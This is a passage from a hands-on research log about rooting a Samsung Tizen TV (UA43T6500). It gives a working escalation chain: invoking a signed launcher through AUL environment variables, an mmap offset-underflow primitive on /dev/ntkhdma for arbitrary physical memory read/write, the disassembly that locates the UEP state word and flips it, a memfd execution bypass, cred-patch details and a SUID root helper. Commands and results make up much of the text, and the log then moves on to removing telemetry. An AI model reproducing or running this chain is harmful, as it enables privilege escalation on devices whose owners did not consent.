runtime->launch(appId, appRootPath, standalonePath, vargs.size(), &vargs[0]);
```

Points that matter:

- **The `__AUL_*` arguments need no decoding.** They are the app framework's own arguments, and
  `launcher.cc` treats every unrecognised argument as a plain app argument (`vargs`) forwarded to
  the assembly. Chapter 3's session spent effort reconstructing the Tizen bundle encoding for
  `__AUL_ROOT_PATH__` etc.; that was unnecessary.
- **Standalone mode never calls `setuid`.** In app launches the process is already `uid=5001`
  because *app-service* execs it that way — not because the launcher drops privileges. Run the
  launcher yourself and the file capabilities (`cap_sys_admin…+eip`, verified earlier with
  `getcap`) are effective.
- `README.md` in the same tarball documents the intent: `--standalone [assembly path]` — "Run
  assembly with the current user environment."

### The unlock: both gates read environment variables (aul 0.23.7)

`src/pkginfo.c`:

```c
const char *__get_preinit_appid(void)
{
    if (!__appid) __appid = getenv("AUL_APPID");
    return __appid;
}

if (getpid() == pid) {                       /* in aul_app_get_appid_bypid_for_uid */
    preinit_appid = __get_preinit_appid();
    if (preinit_appid) { snprintf(appid, len, "%s", preinit_appid); return AUL_R_OK; }
}
```

`src/pkginfo.c` (`aul_get_preinit_root_path`) and `src/aul_path.c` (`__get_path_from_db`):

```c
API const char *aul_get_preinit_root_path(void)
{
    if (!__root_path) __root_path = getenv("AUL_ROOT_PATH");
    return __root_path;
}

root_path = aul_get_preinit_root_path();
if (appid == NULL && root_path) {            /* taken before any app-DB lookup */
    snprintf(buf, ..., "%s%s%s", root_path, ..., dir_name ? dir_name : "");
    *path = strdup(buf); return AUL_R_OK;
}
```

So with `pid == getpid()` (always true for the launcher itself) and both variables set, neither
function ever talks to app-service or the app database.

### The invocation

```sh
AUL_APPID=samudntest01.DnTest \
AUL_ROOT_PATH=/home/owner/share/tmp/sdk_tools/probe \
/usr/bin/dotnet-launcher --standalone /home/owner/share/tmp/sdk_tools/probe/StandaloneProbe.dll
```

- Payload must target **netcoreapp3.0** — the TV only carries `Microsoft.NETCore.App/3.0.0`;
  upstream ships net6.0/netcoreapp3.1 payloads that will not load.
- `/usr/share/dotnet.tizen/framework/Tizen.Init.dll` must exist (the binary's own error string is
  `Failed to locate Tizen.Init.dll`) — unverified on this model, one `ls` away.
- The appid value itself only has to be a plausible string; it is used for `setCmdName`,
  `runtime->launch` and app-root derivation, not for an auth check.

This is the invocation that every later chapter (5–7) actually uses to run managed/native payloads
on the TV.

### Prior art: nobody has published this

Searched GitHub, the Tizen source mirrors and the published Samsung TV root projects on
2026-10-23:

- **[chris-ritsen/samsung-tv-root](https://github.com/chris-ritsen/samsung-tv-root)** (`master`,
  pushed 2026-10-23T11:22Z): `src/samsung_tv_root/archive_root.py` runs **`/usr/bin/dotnet
  <payload>.dll`** and validates `getcap /usr/bin/dotnet` = `cap_setgid,cap_sys_admin`, expecting
  `/usr/share/dotnet.tizen/netcoreapp/`. Their TVs have the `dotnet` muxer; this model does not.
- **[DemonKingSwarn/samsung-tv-tizen-root](https://github.com/DemonKingSwarn/samsung-tv-tizen-root)**
  (QA55QEF1AULXL, Tizen 9.0, `T-RSLFUABC-0090-REL-202608061940`): same lever, `/usr/bin/dotnet`
  with caps plus `launchpad-starter`, full .NET 6 runtime.
- **[sebastianspicker/tiz0wn](https://github.com/sebastianspicker/tiz0wn)**: Remote PC/CIFS route
  and firmware static analysis; no `dotnet-launcher` work.
- The Tizen source itself is public but no write-up uses the `AUL_APPID` / `AUL_ROOT_PATH` preinit
  path to get capability-bearing managed code executed.

Conclusion: the `/usr/bin/dotnet` archive-root method is inapplicable to Tizen 5.5 T-series by
construction, and the env-var route through `dotnet-launcher` appears to be unpublished.

### Pitfalls

- **`sdb shell` exit codes are wrapper artefacts.** `launcher.cc` returns `-1` on the aul failures
  above, yet an injected command can still report `rc=0`. Judge by dlog (`_ERR("Fail to get
  app_id")`, `_INFO("AUL_APPID : %s")`), not by rc.
- **The TV's `dotnet-launcher` is a hydra dispatcher**, so a missing launcher plugin `.so` (the
  `dlopen` target) is a silent failure mode distinct from a bad invocation.
- Do not re-derive the `__AUL_*` bundle encoding; those are app arguments.

### Files

- `~/archive/samsung-tv-t6500-2026-10/exploit-src/tv-src/dotnet-launcher-3.1.0-1.src.rpm`,
  `aul-0.23.7-1.src.rpm`, extracted trees `dotnet-launcher-3.1.0/`, `aul-0.23.7/`
- `tv-src/archive_root.py` (upstream, for reference)
- `tv-src/standalone-probe/` — netcoreapp3.0 probe (`StandaloneProbe.dll`)
- `/tmp/dotnet-launcher` — the TV binary used for the parity check
- `/tmp/rea_dl_analyze.json`, `/tmp/rea_dl_main.json` — rea output

---

## Chapter 5 — Kernel-side root options, and why the official firmware image stays encrypted

*Historical — superseded by Chapter 6 (root and UEP bypass were achieved there), kept as context
for why the eventual route was chosen over these.*

Question asked: instead of more OS-side work, are there published **kernel-side** exploits that
match this hardware? Answer: two that match closely, both blocked on this firmware, plus one
genuinely open avenue (Mali `kbase`) and one enabler that matters more than any of them.

### 1. Official firmware: downloaded, exact build, still encrypted

The firmware is public and we have the exact build the TV runs:

```text
https://downloadcenter.samsung.com/content/FM/202609/20260917163711238/T-KTS2UABC.zip
1,212,211,373 bytes
  T-KTS2UABC/image/info.txt        436 bytes
  T-KTS2UABC/image/upgrade.msd     1,212,018,977 bytes
  T-KTS2UABC/SWU_AUTO_FLAG         1 byte
```

`image/info.txt` (verbatim, md5 `cfd98b6e6f72a87f3c42e48006fafcfa`):

```text
model string: T-KTS2UABC     major version: 2743     minor version: 0
build date: 2026-07-28       used key type: KantS2 rel key
release name: SWU-OU_T-KTS2UABC-02743-2026-07-28-Release
partitions: 12345678910121314151819222324
```

`upgrade.msd` layout (`od -A x -t x1z`):

```text
0x00  MSDU11                     magic
0x0e  sections_count = 10        10 x {u32 id, u64 offs, u64 size} from 0x16
0xde  header_count = 1
0xe2  hdr offs 0xf9, hdr size 0x1148, model_size 0x0a
0xf3  "T-KTS2UABC"
0x101 "Salted__"                 OpenSSL-compatible KDF marker
0x109 salt e78dd33b7947c5dc      8-byte salt
```

**Decryption failed, and not for lack of tooling.** [bugficks/msddecrypt](https://github.com/bugficks/msddecrypt)
parses the container correctly (magic, section table, header region, salt) and then
`tryDecryptHeader()` returns `None` for every entry in `SWU_KEYS`, i.e. no key produces the
`TIZEN_OUIT_HDR_MAGIC` payload header.

What was tried (10 keys x 5 KDFs, all yielding garbage):

- `SWU_KEYS` = `T-HKM`, `T-HKP`, `T-JZM`, `T-HKMFK`, `T-KTM`, `T-KTSU`, `T-KTSD`, `T-KTM2`,
  `T-KTM2L`, `T-NKL`.
- EVP_BytesToKey (MD5 chain) over the ASCII hex key and over the raw bytes;
  `md5(ascii)`/`md5(salt)`, `md5(raw)`/`md5(salt)`, raw/`md5(salt)`.
- The Synacktiv Q60T scheme (`aes_key = md5(passphrase)`, `aes_iv = md5(salt)`; passphrase →
  `784a4ec690511deaa282887bb8d73b67`) — that belongs to the 2020 NikeL generation, not KantS2.

Cross-check from a third party: tiz0wn's firmware analysis concludes Samsung did **not** rotate
the container key between 2021 and 2026 (F3) — but their working key is NikeL (`T-NKL`, `aes_key
5bab1098dab48792619ebd63650d929f`). The KantS2 (`T-KTS2U…`) passphrase is simply not published.

`opensource.samsung.com` searched for `UA43T6500` → **0 results**; there is no GPL source drop for
this model, so the kernel image and the closed binaries (`dotnet-launcher`, `ps_agent`,
`sdbd-tarlauncher`) are not obtainable that way either. Extracting them from the firmware would
not have helped much anyway: they can be pulled from the live TV over the existing injection path,
and the encryption does not hide source.

### 2. The closest published kernel exploit is for the *same* SoC family — and it is dead here

[calif.io/research/samsung-tv](https://calif.io/research/samsung-tv) ·
[writeup](https://github.com/califio/publications/blob/main/MADBugs/samsung-tv/writeup.md)
(2026-03-31) · exploit: `MADBugs/samsung-tv/exploit/{t5300_kernel_rw_chain.c,ntksys_physmap.c,ntkhdma_leak.c,rmem.py}`

Target: **UN43T5300**, Tizen Perf, `KantS2`, Linux `4.1.10` armv7l — identical platform string and
kernel version to this TV. Full chain from a `uid=5001` browser shell to root, data-only (no
kernel image, no kallsyms, no ROP):

- udev rule `99-tztv-media-kants.rules` gives `/dev/ntksys` mode `0666` with
  `SECLABEL{smack}="*"`.
- `KER_SYS_IOC_SET_MEM_INFO` stores attacker-chosen `u32Start`/`u32Size` in a global slot table:
  the slot index is validated, the physical range is not.
- `mmap` then feeds `g_allMemInfo[vma->vm_pgoff].u32Start >> PAGE_SHIFT` into
  `vk_remap_pfn_range` → arbitrary physical read/write.
- `/proc/cmdline` leaks the RAM windows (`400M@32M`, `256M@512M`, `192M@896M`) to bound a scan; the
  scan looks for `struct cred` of the current task (`[usage][uid][gid][euid][egid]` = 5001/100
  repeated) and zeroes it.

**Blocked on this TV**, verified locally: the same `ioctl` still round-trips, but `mmap` on
`/dev/ntksys`, `/dev/ntkmem`, `/dev/ntkxdma` and `/dev/mali0` returns `MAP_FAILED` at every
offset/size/prot combination tried, and `/dev/ntkhdma` + `/dev/ntkgpu` map but ignore the offset.
This matches tiz0wn's static finding of a `check_mmap_area_is_valid`-style whitelist on current
builds. Their kernel is a **Feb 2020** build (`#1 SMP PREEMPT Mon Feb 10 21:41:31 UTC 2020`); this
TV runs **2026-07-28**, six years of hardening later.

Still worth keeping from that repo: `sources/ker_sys.c` and `sources/ker_hdma.c` (the vendor
driver source!) for auditing ioctls that do *not* depend on `mmap`.

### 3. The kernel route that matches this TV's *year*: `/dev/sdp_mem`

[Synacktiv, "Rooting the Samsung Q60T Smart TV"](https://www.synacktiv.com/sites/default/files/2022-05/Sthack2022_Rooting_Samsung_Q60T_Smart_TV.pdf)
· [code](https://github.com/synacktiv/samsung-q60t-exploit) · 2026 walkthrough:
[phylab.space](https://phylab.space/blog/1aa1f40c-655a-46d6-b188-8d7eea2c3398)

Their LPE did not use `ntksys`; it used **`/dev/sdp_mem`**, exposed `crw-rw-rw-` with SMACK label
`*`, whose `sdp_mem_mmap()` hands `vma->vm_pgoff` straight to `remap_pfn_range()` — the mmap
offset **is** the PFN. Arbitrary physical memory, then they flipped the UEP status variable off
and ran unsigned code.

On this TV `/dev/sdp_mem` is `0600 root`, so it is unreachable from `uid=901` (sdk shell) and
`uid=5001` (app). But it is reachable from a **root** process — and a root process is something we
already know how to obtain, transiently, via the Remote PC/CIFS injection (Chapter 2). That
suggests the only chain in this document that builds on proven capability:

```text
one-shot root shell  ->  mmap /dev/sdp_mem (PFN offset)  ->  physical R/W
                     ->  patch UEP status off  ->  exec unsigned ELF/DLL payloads
                     ->  install something that auto-starts
```

UEP (the "unsigned ELF refused" wall) is the single blocker behind persistence, every native
payload, and every boot-time agent. `/dev/sdp_mem` from root is the shortest known way to switch it
off. Unverified on this model at this point — it needs root on the TV first, and it does not
survive reboot by itself (a reboot re-arms UEP and clears the kernel edit), so it has to be paired
with a persistent, non-ELF auto-start hook. (Chapter 6 ended up using `/dev/ntkhdma`, not
`/dev/sdp_mem`, to reach the same UEP state word — see below.)

### 4. Still open at this point: Mali `kbase`

`/dev/mali0` exists on this TV and its `mmap` is rejected — irrelevant, because the kbase bugs
below are **ioctl/heap** bugs, not mmap bugs, so the whitelist that killed `ntksys` does not
apply. Candidates for a 2020-era driver, newest first:

- **CVE-2024-23384**, **CVE-2023-48409**, **CVE-2023-4211** (UAF, exploited in the wild in 2023) —
  the 2023/2024 kbase family.
- **CVE-2022-46395** — free-memory access; Man Yue Mo's
  [exploit](https://github.com/github/securitylab/tree/main/SecurityExploits/Android/Mali/CVE_2022_46395)
  and [GHSL-2022-127](https://securitylab.github.com/advisories/GHSL-2022-127_Arm_Mali/). This is
  the one tiz0wn selected for their 2020 Q60T and left **unfinished**; the public exploit is
  aarch64 (Pixel), so armv7 porting work is required.
- **CVE-2022-20186 / GHSL-2022-053** — alias-memory UAF with a full arbitrary-kernel-R/W write-up:
  [Corrupting memory without memory corruption](https://techreport.ngo/security/corrupting-memory-without-memory-corruption/).
- **CVE-2021-39793 / CVE-2022-22706** — imported read-only pages made host-writable; see Project
  Zero's
  [0-day-in-the-wild RCA](https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-39793.html).
- **CVE-2021-28663 / CVE-2021-28664** — GPU memory operations → kernel read/write, affects r29 and
  older; PoC [lntrx/CVE-2021-28663](https://github.com/lntrx/CVE-2021-28663), full chain in the
  [Grayshift paper](https://www.bernardlampe.com/pub/Grayshift-CVE-2021-28663.pdf).

Two facts that make this cheaper than it looks:

- These armv7 Tizen kernels ship **without KASLR**. tiz0wn's recovered static symbol table for a
  2020 Q60T has `kernel_image_base = 0xc0008000`, `prepare_kernel_cred = 0xc00467e0`,
  `commit_creds = 0xc0046198`. (Different model, but indicative; verify against our own kernel.)
- Data-only targets (cred walk, as in califio's chain) do not need those symbols at all — only a
  physical or kernel-address read/write primitive.

(This route was never pursued further: Chapter 6's `/dev/ntkhdma` primitive made it unnecessary.)

### 5. The enabler that matters more than a specific CVE: memfd

UEP refuses ELF files on disk. It does not police anonymous executable memory. The whole bypass is
`rmem.py` from califio's repo:

```python
SYS_memfd_create = 385                    # ARM 32-bit syscall number
fd = memfd_create(b"m"); os.write(fd, data)
os.execve("/proc/self/fd/%d" % fd, argv, os.environ)
```

So "unsigned ELF is blocked" is really "we need an interpreter on the TV". Check `command -v
python3 perl node busybox` before assuming a native payload is impossible — if any exist, any
armv7 exploit we build becomes runnable without touching the root filesystem.

### 6. Generic 4.1.10 LPEs: not worth the time

Dirty COW (CVE-2016-5195) has been fixed in 4.1.y since 2016 and Samsung's tree certainly carries
the fix. The netfilter/AF_PACKET class (CVE-2021-22555, CVE-2020-14386, CVE-2017-7308) requires
`CAP_NET_RAW` or unprivileged user namespaces; both the sdk shell (`uid=901`) and app context
(`uid=5001`) run with `CapEff=0` and no userns. Dirty Pipe and the io_uring family need ≥ 5.8.

### 7. Ranking at this point (effort to root, cheapest first)

1. **`dotnet-launcher --standalone` + `AUL_APPID`/`AUL_ROOT_PATH`** — Chapter 4; invocation known,
   payload built, one TV-on session away.
2. **Root shell → `/dev/sdp_mem` physmap → UEP off** — converts the transient root into "can
   execute native code", which is the prerequisite for persistence.
3. **Mali `kbase` CVE port to armv7** (CVE-2022-46395 or CVE-2022-20186) — best pure-kernel route
   on this firmware, gated on a version probe.
4. Generic kernel CVEs — skip.

(In the end, Chapter 6 found a *third* physmap device — `/dev/ntkhdma`, world-writable — which
beat both #1 and #2 above by not even needing the dotnet-launcher trick for the physmap step.)

### 8. Recon batch planned for the next TV-on session

This whole pass was scripted on the controller:
`~/archive/samsung-tv-t6500-2026-10/exploit-src/kants2-exploit/nextweek.py` (fedora). It listens
for the Remote-PC/CIFS root callback, runs every stage below, pushes and runs the
`dotnet-launcher` standalone probe, and writes `kants2-exploit/nextweek-<ts>/` with one file per
stage plus a `SUMMARY.md` of verdicts (script-trojan candidates, writable real filesystems,
`/dev/sdp_mem` mode, kbase version, managed-code result):

```sh
cd ~/archive/samsung-tv-t6500-2026-10/exploit-src/kants2-exploit
python3 nextweek.py --selftest          # framing against local bash: must PASS
python3 nextweek.py --mock              # full battery against local bash
python3 nextweek.py --sdb-ip 192.168.50.31          # real run (+ uid=901 check)
#   add --rootfs-write-test to attempt remount,rw / and one touch (self-reverting)
```

Then trigger on the TV (Source -> Remote Access -> Remote PC -> Shared Folder) with the payload
the script prints. It stays attached afterwards as a command queue: `echo '<cmd>' >>
/tmp/nextweek_cmd.txt`, read `/tmp/nextweek_shell.out`.

Raw equivalent of the stages, if the script is unavailable:

```sh
find / -xdev \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null
getcap -r / 2>/dev/null
awk '$4 ~ /^rw/ {print $2, $3, $1}' /proc/mounts
grep -rh '^ExecStart=' /lib/systemd/system/ 2>/dev/null | sort -u
ls -l /usr/apps/privileged-service/bin/
ls -l /dev/mali0 /dev/sdp_mem /dev/tzmem /dev/ntk* /dev/sdp_hwmem 2>&1
cat /sys/module/mali/version 2>&1
id; cat /proc/self/attr/current
for t in python3 python perl node busybox; do command -v $t; done
head -3 /proc/kallsyms; cat /proc/cmdline
```

`mali/version` selects the applicable kbase CVE; `id` plus node modes say what is reachable from
`uid=901`; the interpreter list decides whether the memfd bypass is available; readable
`/proc/kallsyms` would make a Mali chain much cheaper. The kept `find`/`getcap` pair and the
`ExecStart` list crossed with the rw mounts are what turn "script-trojan persistence: maybe" into
a verdict.

---

## Chapter 6 — Root and UEP bypass on Samsung UA43T6500AKXXD (KantS2 / NT72172)

*Current. This is the main result: root and UEP bypass, both verified on the device.*

### Summary

The TV is rooted from an unprivileged `uid=901(sdk)` starting point, and its **UEP** ("unsigned
executable prevention") gate is switched off, so unsigned native binaries, SUID binaries and shell
scripts execute.

Two independent results, both verified on the device:

1. **Arbitrary physical memory R/W** via `/dev/ntkhdma`, which is world `rw-rw-rw-`. Escalation to
   `uid=0` with `CapEff ffffffffffffffff` is a cred patch over DRAM.
2. **UEP state word located and flipped**: VA `0xC06236EC` / PA `0x026236EC`, `1` = enforce, `0` =
   disabled. Root alone does *not* lift UEP; this word does.

The expensive part (a 57 s DRAM scan for `struct cred`) turned out to be unnecessary for ordinary
use: with UEP off, a SUID-root binary on the writable `/opt` partition yields `euid=0` in **151
ms** end to end.

### Starting identity

`uid=901(sdk)`, SMACK label `System`, `CapEff 0000000000000000`, `CapBnd 0000000300200040`. sdb
over TCP reachable; `sdb shell` is unreliable (`appcmd_support:disabled`), only a retry-wrapped
capture path works. Writable partitions: `/opt`, `/mnt/systemrw`, `/mnt/drm` are rw vdfs on eMMC
and survive reboot; `/etc` is read-only; `/tmp`, `/dev/shm`, `/run` are tmpfs.

### Why root is not enough: UEP

After every escalation attempt the failure looked like a permission problem:

```
bash: /opt/hermes/root.sh: Operation not permitted     (EPERM, errno 1)
```

This reproduced for `0755` and `4755` copies, on vdfs and tmpfs, with SMACK label `_` (correct,
same as signed system binaries) and label `System`. Diagnostics that were all **red herrings**:
the SUID bit, the SMACK label, `noexec`/`nosuid` mount flags, and remount/bind attempts
(`MS_BIND` and remount both refused, `rc=-1`). `/bin/sh` from the kernel's own read-only image
executed fine while every file we created was refused — the decision was signature-based, not
mode- or label-based.

Running the script produced the actual reason:

```
[uep][bash] the file is NOT signed!! : /opt/hermes/root.sh
```

UEP is built into the kernel, not a loadable module: `/sys/module/uep` exposes only `uevent` and
`version` (`0.0.1`), no parameters, no `.text`/`.data` sections, and `/proc/kallsyms` and
`/proc/modules` give nothing usable.

### Primitive: `/dev/ntkhdma`

The Novatek HDMA driver is the whole entry point. It is world-writable, and two bugs compose:

- `GET_BUFF_ADDR = _IOR(90,3,4) = 0x80045A03` returns the DMA buffer's physical base (observed
  `0x93040000`), defeating address randomisation by leaking a phys anchor.
- its `mmap` computes `phys = gu32HDMAMemPhysAddr + (vm_pgoff << 12)` but validates with
  `gu32HDMAMemSize - off`, which **underflows** for `off > size`, so any PFN can be mapped.

Mapping an arbitrary physical page therefore needs only arithmetic:

```c
off  = (target_phys - leaked_base) & 0xFFFFFFFF;   /* intentional wrap */
offA = off & ~0xFFF;
delta = off - offA;                                 /* in-page offset */
map  = mmap(NULL, len + 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offA);
/* target = (char*)map + delta */
```

Related devices are dead ends: `/dev/ntksys` mmap is compiled out, `/dev/ntkmem` is ioctl-only
(`lseek`/`read`/`mmap` all return `-1`) — consistent with Chapter 2/5's findings.

DRAM that is safe to touch (from `/proc/cmdline`): `0x02000000-0x3AC00000` and
`0x80000000-0x9C000000`. Flash, eMMC partitions, bootloader, MMIO and `/dev/eeprom` were never
written — every write in this work is one 32-bit word inside those two DRAM ranges.

### Finding the UEP state word

Public prior art (chris-ritsen/samsung-tv-root `QN90B_REPRODUCTION.md`) says UEP is a separate
execution boundary after `uid 0` and is released by flipping a kernel state word (their value
`phys 0x208c26c4`, volatile). The word is build-specific, so it has to be located per firmware.
Recipe:

1. **Dump kernel memory.** A managed payload (`dotnet-launcher --standalone`, the invocation from
   Chapter 4) streamed 20 MB of physical `0x02000000..` over raw TCP to the control host; a
   managed probe cannot write to tmpfs reliably, and stdout is swallowed by the launcher, so TCP
   is the only dependable channel.
2. **Extract the driver's strings.** They sit in `.rodata` with `VA = file offset + 0xC0000000`
   (phys base `0x02000000`, delta `0xBE000000`):

   | string | VA |
   |---|---|
   | `[%s] Blocked! cur pid:%u, comm:%s, kuep:%c` | `0xC056056C` |
   | `[%s] file %s is not signed. Sign it.` | `0xC0560E54` |
   | `[%s] Verification correct` | `0xC0560E94` |
   | `[%s] UEP has been disabled` | `0xC0561004` |
   | `hash of DUID has been set` | `0xC0561070` |

3. **Find the code that references them.** A literal-pool scan finds nothing, and a naive
   "PC-relative `add`/`ldr`" capstone scan finds nothing either — the ARM compiler materialises
   these addresses with `movw`/`movt` immediate pairs. Tracking those two instructions per
   register and matching the assembled 32-bit value lands the driver's code at
   `0xC01CE800-0xC01CFD00`.
4. **Read the disable path.** The `UEP has been disabled` reference sits at `0xC01D3A64`, and a
   few instructions earlier comes the whole answer:

   ```
   movw ip, #0x36ec
   movt ip, #0xc062        ; ip = 0xC06236EC
   ...
   mov  lr, #0
   str  lr, [ip]           ; *0xC06236EC = 0   <- UEP disabled
   movw r2, #0x1004
   movt r2, #0xc056        ; "[%s] UEP has been disabled"
   bl   printk
   ```

**UEP state word: VA `0xC06236EC`, PA `0x026236EC`. `1` = enforce, `0` = off. Volatile — a reboot
re-arms it.**

### Verification

Causality was proven in both directions in one run, so this is not a coincidence:

```
UEP state word PA 0x026236ec (VA 0xC06236EC) = 0x00000001
wrote 0 -> readback 0x00000000
AFTER flip: /opt/hermes_root -> exit=0 out=[0 | System]     # unsigned binary, uid 0
AFTER flip: /opt/h_plain     -> exit=0                      # unsigned, no SUID
restored 1 -> exit=97 EXECFAIL errno=1                      # EPERM returns
```

Time to flip, measured by a payload that logs over TCP with millisecond stamps:

```
hdmaBase=0x93040000 @96ms
UEP word 1 -> 0 @97ms
suid probe [0 | uid=0(root) |] @151ms
FASTROOT_END total=152ms
```

### Fast path: SUID + UEP off (why the DRAM scan is now only a fallback)

Once UEP is off, a SUID-root shell on `/opt` does the rest, which removes the 57 s DRAM cred scan
from the normal path. Verified from a genuine unprivileged context (`setuid(901)` in a native
helper, then exec):

```
uid=901(sdk)                       -> /bin/sh -c id
uid=901(sdk) euid=0(root)          -> /opt/hermes_root -p -c id      (SUID transition works)
```

So a cold boot costs: one signed-launcher invocation to flip the word (~150 ms plus launcher
start), then any command through `/opt/hermes_root -p`. The cred patch remains worthwhile only
when a process needs **full** capability sets (`CapEff ffffffffffffffff`) rather than the SUID
bounding set (`0000000300200040`), or when the SUID file is unavailable.

Cred patch mechanics, for reference: scan 1 MB chunks for `struct cred` — word 0 `usage` in `(0,
0x1000]` and `uid=euid=suid=fsuid=901`; constrain on uid only (gid fields may differ, and
requiring them misses the process). Zero the eight id words, set the four `kernel_cap_t` pairs at
offsets 40/48/56/64 to `-1`, then confirm with `getuid()` inline and stop at first success. Full
DRAM coverage takes about 57 s and patched 119-156 cred structures in observed runs.

### The `hr` helper (native, no libc)

`/opt/hermes/hr` is a 2.8 KB statically linked armv7 ELF built on the control host:

```sh
clang -target armv7-linux-gnueabihf -nostdlib -static -O2 -fno-stack-protector \
      -fuse-ld=lld -Wl,-e,_start -o hr hr.c
```

It uses only raw ARM EABI syscalls via `svc #0` (`open`=5, `ioctl`=54, `mmap2`=192, `setuid`=23,
`execve`=11), so it needs no glibc on Tizen. Modes:

- default: disable UEP, then `execve("/opt/hermes_root", {"-p", ...})` → root shell
- `hr -c '<cmd>'`: same, passing the command through to the SUID shell
- `hr -u <uid> <path> [args]`: drop to a plain uid, then exec (used to prove the SUID transition
  without rebooting)
- `hr -a 0|1`: write the UEP word directly (1 re-arms, 0 disables) — a test hook

**Gotcha that cost a cycle:** with `-nostdlib`, a C `_start` cannot read `argc` from `sp`
reliably, because the compiler's prologue pushes registers first. The entry must be a
hand-written asm stub that moves `sp` into `r0` and tail-calls the C function. Before that fix
`hr` silently exec'd `bash -p` with a wrong argv, which looked like "SUID blocked" but was
actually bash waiting on an empty stdin.

### Invocation contract and gotchas

- Launch payloads with the **signed** launcher (the Chapter 4 invocation), from an app dir under
  `/home/owner/share/tmp/...`:

  ```sh
  AUL_APPID=samudntest01.Mali AUL_ROOT_PATH=<appdir> \
    /usr/bin/dotnet-launcher --standalone <appdir>/payload.dll
  ```

- **The launcher will not run a DLL under `/opt`** even with `AUL_ROOT_PATH=/opt/hermes` — it
  exits `0` and the payload never starts (no log, no TCP callback). Keep the canonical copy in
  `/opt/hermes/` (persistent) and copy it into the app dir before running.
- Never do a blocking read through `sdb shell` (e.g. `head -c 400000 /dev/kmsg`): it wedges
  `sdbd` until the TV is power-cycled.
- sdb capture is flaky; retry `disconnect()`/`connect()`/`require_device()` with 4-8 s settles, up
  to 8 times.
- A TV in standby looks identical to a hang: ping 100 % loss, HTTP `000`, sdb unregistered.
  Wake-on-LAN magic packet to `64:E7:D8:EC:38:EE` (UDP 9/7 broadcast) recovers it; remote
  power-**off** is not available (see [power states](samsung-tv-t6500-power-states-and-remote-control.md)).
- The control host firewall must trust the TV's address **permanently**
  (`firewall-cmd --zone=trusted --add-source=192.168.50.31 --permanent`), else the TV→host TCP
  logging dies after every reboot.

### Persistence reality (at this point — solved in Chapter 7)

- `/opt` is eMMC-backed, so payloads in `/opt/hermes/` survive reboot, and the SUID bit on
  `/opt/hermes_root` is honoured (`euid=0` from `uid=901`).
- **UEP re-arms and cred patches vanish on every boot.** After a reboot the chain must be re-run:
  copy the payload into the app dir and invoke the signed launcher once (~150 ms of payload
  work).
- **Solved on 2026-10-25 — see Chapter 7 below.** The blocker was never "no writable path executed
  by init" so much as "no writable *file* executed by init": the read-only `/` still has a
  writable **block device**, and `tizen-system-env.service` *sources* every
  `/etc/profile.d/*.sh` as root. Patching the vendor `bash_prompt_custom.sh` in place at the
  raw-block level, at exactly the same byte length, gives root ~1 s after every power-on with no
  host, no sdb and no exploit. The route was taken from
  [`cfloinc/samsung-q70t-tizen-root`](https://github.com/cfloinc/samsung-q70t-tizen-root).

Measured after an actual unplug/replug (2026-10-24, `/proc/uptime` 203 s), layer by layer:
launcher `HIDE_IDS` and the `ConditionPathExists` markers survive because they are files on
`/opt`; `pkgcmd -D` deactivations, `systemctl stop`/`mask --runtime`, the `/etc/hosts` bind mount
and the UEP flip do not. Running services go `104 -> 115` on their own and the telemetry daemons
(`media-analytics`, `contents-recognition`, `vision-data-recognition`, `voice-app`) come back at
boot. Re-apply is two commands and is scripted — full matrix and re-apply sequence in the
companion doc, [samsung-tv-t6500-debloat-and-launcher.md § cold-boot survival](samsung-tv-t6500-debloat-and-launcher.md#cold-boot-survival-matrix),
which also records why each script must be invoked as data (`hermes_root -p -c 'sh -c "$(cat
…)"'`) even while root: UEP re-armed inside the same session during that run.

### Debloat with root

Root's practical value on this set is control of the writable partitions plus systemd, and a few
hard limits that shape what debloat can actually be.

Verified facts:

- **PID 1 is systemd** (`/usr/lib/systemd/systemd`). An earlier note in this repo claiming the TV
  has no systemd is wrong.
- `/` is vdfs **read-only and cannot be remounted** (`mount -o remount,rw /` -> `cannot remount
  ... is write-protected`, rc 32). `/etc/systemd/system` is read-only too, so units cannot be
  added, edited or persistently masked. `systemctl stop` and `systemctl mask --runtime` work —
  the mask symlinks land in `/run/systemd/system/* -> /dev/null` — but everything dies at reboot.
- **Bind mounts work** with full caps, which is the way to persist configuration on a read-only
  rootfs: `mount --bind /opt/hermes/hosts.block /etc/hosts`. The source file lives on rw `/opt`,
  so only the mount has to be re-applied per boot. `/etc/hosts` itself is **read-only** (`Read-only
  file system` even as `uid=0` with `CapEff ffffffffffffffff`, 148 bytes), so writing the
  sinkhole entries into it in place is not available on this build (see the launcher-curation
  doc for the symptom this caused). Worth checking whether the sinkhole is even needed: the LAN
  resolver already returns `0.0.0.0` for `samsungads.com` / `samsungacr.com` /
  `smetrics.samsung.com`.
- `iptables` is present (with Samsung's own `DPM-ALLOW` / `DPM-DENY` chains) but there is **no
  `xt_owner`** module, so rules cannot match a uid — destination IP/CIDR only.
- Apps split across partitions: `/usr/apps` (256 entries) is on the read-only rootfs and cannot be
  deleted; `/opt/usr/apps` (164 entries, including `adplatform`, `kpi-logging`, `sp-kpi`,
  `com.samsung.tv.adplayer`, `com.samsung.tv.ad-web-framework`) is on rw `/opt` and can be removed
  or quarantined.

#### Applied

`/opt/hermes/debloat.sh` stops and runtime-masks the telemetry/ad/update units and bind-mounts an
ad/ACR sinkhole over `/etc/hosts`. Result on the device:

```
== stopping telemetry/ad/update units ==
acr.path=inactive           acr.service=failed
adagent-service.service=failed   kpi-logging.service=inactive
abnormal_user_behavior.service=inactive
emergency-log-transmitter.service=inactive
background-update.service=inactive   background-update.path=inactive
== hosts sinkhole ==
bind-mounted /opt/hermes/hosts.block over /etc/hosts
running services: 110        (was 116)
hosts mount: 1
```

`acr.service` and `adagent-service.service` report `failed` rather than `inactive` because they
exit non-zero when stopped; they are not running. `ac.service` (application manager) was
deliberately left alone. TV remained healthy throughout: ICMP 0 % loss, `:8001/api/v2/` HTTP 200,
and `samsung.com` still resolves normally while `samsungads.com` / `samsungacr.com` resolve to the
sinkhole.

Stopped units: `acr.service`, `acr.path` (automatic content recognition),
`adagent-service.service`, `kpi-logging.service`, `abnormal_user_behavior.service`,
`emergency-log-transmitter.service`, `background-update.service`, `background-update.path`.

#### Package disable + persistent unit markers (v2)

The first attempt renamed seven app directories under `/opt/usr/apps` to `*.disabled`. That was
reverted: it works, but it leaves the package database believing the app is installed while its
files are missing. Tizen has a proper mechanism, and it also covers apps on the read-only rootfs.

**1. `pkgcmd -D` — deactivate a package for a user.** From `pkgcmd --help`: `--uid  Specify
